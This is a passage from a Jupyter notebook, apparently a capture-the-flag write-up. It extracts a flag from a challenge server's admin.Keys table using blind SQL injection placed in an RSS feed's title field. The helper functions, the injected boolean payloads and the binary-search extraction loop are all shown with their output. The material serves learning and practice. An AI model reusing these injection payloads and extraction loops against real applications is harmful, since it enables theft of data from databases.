       "(True, 'Feed with same title already exists!', <Response [500]>)"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 2nd character of flag is (small) 'o', should return true\n",
    "query_challenge_union(\n",
    "    \"admin.Keys\",\n",
    "    \"Keys.key LIKE 'govtech-csg{%' AND ASCII(RIGHT(LEFT(Keys.key, 2), 1)) = ASCII('o')\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To speed things up, we can make another helper function."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "def query_character_eq(index, character): # index is 0-indexed\n",
    "    return query_challenge_union(\n",
    "        \"admin.Keys\",\n",
    "        f\"Keys.key LIKE 'govtech-csg{{%' AND ASCII(RIGHT(LEFT(Keys.key, {index + 1}), 1)) = ASCII('{character}')\"\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "((False,\n",
       "  \"Failed to add ' OR (SELECT COUNT(*) FROM admin.Keys WHERE Keys.key LIKE 'govtech-csg{%' AND ASCII(RIGHT(LEFT(Keys.key, 3), 1)) = ASCII('V')) != 0 AND '1'='1; no new feeds allowed!\",\n",
       "  <Response [200]>),\n",
       " (True, 'Feed with same title already exists!', <Response [500]>))"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Sanity check the eq helper function, third character is (small) 'v', should return false, true\n",
    "query_character_eq(2, 'V'), query_character_eq(2, 'v')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can get a list of all printable characters and try to brute force the flag!\n",
    "\n",
    "If we want to find the 13th character (the one after `{`), we loop through all the printable characters. First query `query_character_eq(12, 'a')`, then `query_character_eq(12, 'b')` and so on until one character returns a true response, which means we've found the character!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'!\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import string\n",
    "charset = list(sorted(string.ascii_letters + string.digits + string.punctuation))\n",
    "\"\".join(charset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEF... Found F\n",
      "govtech-csg{F\n"
     ]
    }
   ],
   "source": [
    "known = 'govtech-csg{'\n",
    "for c in charset:\n",
    "    print(c, end='')\n",
    "    if query_character_eq(12, c)[0]:\n",
    "        print(f'... Found {c}')\n",
    "        known = known + c\n",
    "        break\n",
    "print(known)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Oh man, that was really slow just to find one character. Turns out there is a faster way to do it by using [binary search](https://security.stackexchange.com/a/16039). We can use a helper query which uses the `>=` operator instead and a more complex search to find the key faster."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "def query_character_geq(index, character):\n",
    "    return query_challenge_union(\n",
    "        \"admin.Keys\",\n",
    "        f\"Keys.key LIKE 'govtech-csg{{%' AND ASCII(RIGHT(LEFT(Keys.key, {index + 1}), 1)) >= ASCII('{character}')\"\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "((True, 'Feed with same title already exists!', <Response [500]>),\n",
       " (True, 'Feed with same title already exists!', <Response [500]>),\n",
       " (False,\n",
       "  \"Failed to add ' OR (SELECT COUNT(*) FROM admin.Keys WHERE Keys.key LIKE 'govtech-csg{%' AND ASCII(RIGHT(LEFT(Keys.key, 1), 1)) >= ASCII('h')) != 0 AND '1'='1; no new feeds allowed!\",\n",
       "  <Response [200]>))"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Sanity check the geq helper function, first character is 'g', should return True, True, False\n",
    "query_character_geq(0, 'f'), query_character_geq(0, 'g'), query_character_geq(0, 'h')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "govtech-csg{\n",
      "P8DJGEF... Found F\n",
      "govtech-csg{F\n",
      "P8,2534... Found 3\n",
      "govtech-csg{F3\n",
      "Pg[adef... Found e\n",
      "govtech-csg{F3e\n",
      "Pg[ade... Found d\n",
      "govtech-csg{F3ed\n",
      "Pg[a^_`... Found _\n",
      "govtech-csg{F3ed_\n",
      "Pgsmpn... Found m\n",
      "govtech-csg{F3ed_m\n",
      "P8,2534... Found 3\n",
      "govtech-csg{F3ed_m3\n",
      "Pg[a^_`... Found _\n",
      "govtech-csg{F3ed_m3_\n",
      "P8,&#\"... Found !\n",
      "govtech-csg{F3ed_m3_!\n",
      "Pgsmpno... Found n\n",
      "govtech-csg{F3ed_m3_!n\n",
      "P8DJMK... Found J\n",
      "govtech-csg{F3ed_m3_!nJ\n",
      "P8,2534... Found 3\n",
      "govtech-csg{F3ed_m3_!nJ3\n",
      "Pg[adbc... Found c\n",
      "govtech-csg{F3ed_m3_!nJ3c\n",
      "Pg[URST... Found T\n",
      "govtech-csg{F3ed_m3_!nJ3cT\n",
      "P8,256... Found 5\n",
      "govtech-csg{F3ed_m3_!nJ3cT5\n",
      "Pgsy|}~... Found }\n",
      "Done!\n",
      "govtech-csg{F3ed_m3_!nJ3cT5}\n"
     ]
    }
   ],
   "source": [
    "known = \"govtech-csg{\"\n",
    "\n",
    "while True:\n",
    "    print(known)\n",
    "    lb = 0\n",
    "    ub = len(charset)\n",
    "    while ub - lb != 1:\n",
    "        md = (ub + lb) // 2\n",
    "        print(charset[md], end='')\n",
    "        res = query_character_geq(len(known), charset[md])\n",
    "        if res[0]:\n",
    "            lb = md\n",
    "        else:\n",
    "            ub = md\n",
    "    known = known + charset[lb]\n",
    "    print(f\"... Found {charset[lb]}\")\n",
    "    if known[-1] == \"}\":\n",
    "        break\n",
    "print(\"Done!\")\n",
    "print(known)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Summary"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Solution is to:\n",
    "- Locate feed submission that will accept a XML RSS feed\n",
    "- Serve an XML RSS feed with a web server of your choice\n",
    "- Manipulate the text in the `<title>` tag to get SQL injection, keeping in mind proper XML character escaping\n",
    "- Get blind SQL injection\n",
    "- Enumerate database schema with SQLi\n",
    "- Leak flag with SQLi (and optional binary search speedup)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
